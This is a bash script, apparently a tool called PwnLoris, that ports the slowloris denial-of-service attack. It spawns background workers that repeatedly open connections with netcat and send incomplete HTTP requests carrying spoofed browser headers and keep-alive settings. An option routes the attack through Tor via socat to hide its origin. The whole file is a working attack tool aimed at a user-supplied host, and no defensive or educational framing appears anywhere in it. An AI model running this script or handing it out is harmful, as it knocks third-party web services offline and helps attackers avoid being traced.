#!/bin/bash

# PwnLoris - Bash implementation of slowloris DoS tool
# An improved slowloris DOS tool converted to bash

# Default values
HOST=""
TOR=false
THREADS=8
KEEPALIVE=90
INTERVAL=5
SOCKSHOST="127.0.0.1"
SOCKSPORT=9050

# Counters
SUCCESS_COUNT=0
FAILED_COUNT=0

# Colors
RED='\033[91m'
GREEN='\033[92m'
BLUE='\033[94m'
GRAY='\033[90m'
BOLD='\033[1m'
RESET='\033[0m'

# Function to display banner
print_banner() {
    echo -e "${BLUE}"
    echo "______ _    _ _   _  _     ___________ _____ _____"
    echo "| ___ \ |  | | \ | || |   |  _  | ___ \_   _/  ___|"
    echo "| |_/ / |  | |  \| || |   | | | | |_/ / | | \ \`--. "
    echo "|  __/| |/\| | . \` || |   | | | |    /  | |  \`--. \ "
    echo "| |   \  /\  / |\  || |___\ \_/ / |\ \ _| |_/\__/ /"
    echo "\_|    \/  \/\_| \_/\_____/\___/\_| \_|\___/\____/ "
    echo "An improved slowloris DOS tool converted to bash"
    echo -e "${RESET}\n"
}

# Function to print usage
print_usage() {
    echo "Usage: $0 <host[:port]> [options]"
    echo ""
    echo "Options:"
    echo "  -t, --tor           Enable attack through TOR"
    echo "  -n <threads>        Number of threads (default: 8)"
    echo "  -k <keepalive>      Seconds to keep connection alive (default: 90)"
    echo "  -i <interval>       Seconds between keep alive intervals (default: 5)"
    echo "  -sh <sockshost>     Host TOR is running (default: 127.0.0.1)"
    echo "  -sp <socksport>     Port TOR is using (default: 9050)"
    echo "  -h, --help          Show this help message"
    echo ""
}

# Function to parse host and port
parse_host_port() {
    if [[ "$HOST" == *":"* ]]; then
        PORT="${HOST##*:}"
        HOST="${HOST%:*}"
    else
        PORT=80
    fi
}

# Function to print target info
print_target() {
    echo -e "Attacking ${BOLD}${HOST}:${PORT}${RESET}"
}

# Function to print status
print_status() {
    local extra="$1"
    local status_line="${GREEN}Payloads successful: ${SUCCESS_COUNT}${GRAY}, ${RED}payloads failed: ${FAILED_COUNT}"
    if [ -n "$extra" ]; then
        status_line="${status_line}${RESET}, $extra"
    fi
    echo -ne "${status_line}${RESET}\r"
}

# Function to create HTTP payload
create_payload() {
    local host="$1"
    local random=$((RANDOM % 10000))
    local method
    
    if (( random % 2 == 0 )); then
        method="POST"
    else
        method="GET"
    fi
    
    cat << EOF
${method} /?${random} HTTP/1.1\r
Host: ${host}\r
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r
Connection: Keep-Alive\r
Keep-Alive: timeout=${KEEPALIVE}\r
Content-Length: 42\r
\r
EOF
}

# Function to send payload using netcat or socat
send_payload() {
    local host="$1"
    local port="$2"
    local payload
    
    payload=$(create_payload "$host")
    
    if [ "$TOR" = true ]; then
        # Use socat with SOCKS5 proxy for TOR
        if command -v socat >/dev/null 2>&1; then
            echo -e "$payload" | timeout 5 socat - "SOCKS5:${SOCKSHOST}:${host}:${port},socksport=${SOCKSPORT}" 2>/dev/null
        else
            echo "Error: socat not found. Install socat for TOR support."
            return 1
        fi
    else
        # Use netcat for direct connection
        if command -v nc >/dev/null 2>&1; then
            echo -e "$payload" | timeout 5 nc "$host" "$port" 2>/dev/null
        elif command -v netcat >/dev/null 2>&1; then
            echo -e "$payload" | timeout 5 netcat "$host" "$port" 2>/dev/null
        else
            echo "Error: netcat not found. Install netcat."
            return 1
        fi
    fi
}

# Function to run attack in background
attack_worker() {
    local host="$1"
    local port="$2"
    local worker_id="$3"
    
    while true; do
        local tries_failed=0
        local connections=0
        
        # Create multiple connections
        while [ $tries_failed -lt 5 ] && [ $connections -lt 50 ]; do
            if send_payload "$host" "$port"; then
                ((SUCCESS_COUNT++))
                ((connections++))
            else
                ((FAILED_COUNT++))
                ((tries_failed++))
            fi
            
            print_status
            sleep 0.1
        done
        
        # Wait before next round
        sleep "$KEEPALIVE"
    done
}

# Function to start attack threads
start_attack() {
    local host="$1"
    local port="$2"
    
    print_target
    print_status
    
    # Start worker processes in background
    for ((i=1; i<=THREADS; i++)); do
        attack_worker "$host" "$port" "$i" &
    done
    
    # Wait for interrupt
    wait
}

# Signal handler
cleanup() {
    echo -e "\n${GREEN}:)${RESET}"
    # Kill all background jobs
    jobs -p | xargs -r kill 2>/dev/null
    exit 0
}

# Main function
main() {
    # Set up signal handlers
    trap cleanup SIGINT SIGTERM
    
    parse_host_port
    
    # Check if required tools are available
    if [ "$TOR" = true ] && ! command -v socat >/dev/null 2>&1; then
        echo "Error: socat is required for TOR support. Install with: apt-get install socat"
        exit 1
    fi
    
    if ! command -v nc >/dev/null 2>&1 && ! command -v netcat >/dev/null 2>&1; then
        echo "Error: netcat is required. Install with: apt-get install netcat"
        exit 1
    fi
    
    start_attack "$HOST" "$PORT"
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tor)
            TOR=true
            shift
            ;;
        -n)
            THREADS="$2"
            shift 2
            ;;
        -k)
            KEEPALIVE="$2"
            shift 2
            ;;
        -i)
            INTERVAL="$2"
            shift 2
            ;;
        -sh)
            SOCKSHOST="$2"
            shift 2
            ;;
        -sp)
            SOCKSPORT="$2"
            shift 2
            ;;
        -h|--help)
            print_banner
            print_usage
            exit 0
            ;;
        -*)
            echo "Unknown option: $1"
            print_usage
            exit 1
            ;;
        *)
            if [ -z "$HOST" ]; then
                HOST="$1"
            else
                echo "Error: Multiple hosts specified"
                print_usage
                exit 1
            fi
            shift
            ;;
    esac
done

# Check if host is provided
if [ -z "$HOST" ]; then
    print_banner
    echo "Error: Host is required"
    print_usage
    exit 1
fi

# Validate numeric arguments
if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ]; then
    echo "Error: Invalid number of threads"
    exit 1
fi

if ! [[ "$KEEPALIVE" =~ ^[0-9]+$ ]] || [ "$KEEPALIVE" -lt 1 ]; then
    echo "Error: Invalid keepalive value"
    exit 1
fi

if ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] || [ "$INTERVAL" -lt 1 ]; then
    echo "Error: Invalid interval value"
    exit 1
fi

if ! [[ "$SOCKSPORT" =~ ^[0-9]+$ ]] || [ "$SOCKSPORT" -lt 1 ] || [ "$SOCKSPORT" -gt 65535 ]; then
    echo "Error: Invalid SOCKS port"
    exit 1
fi

# Print banner and start
print_banner
main
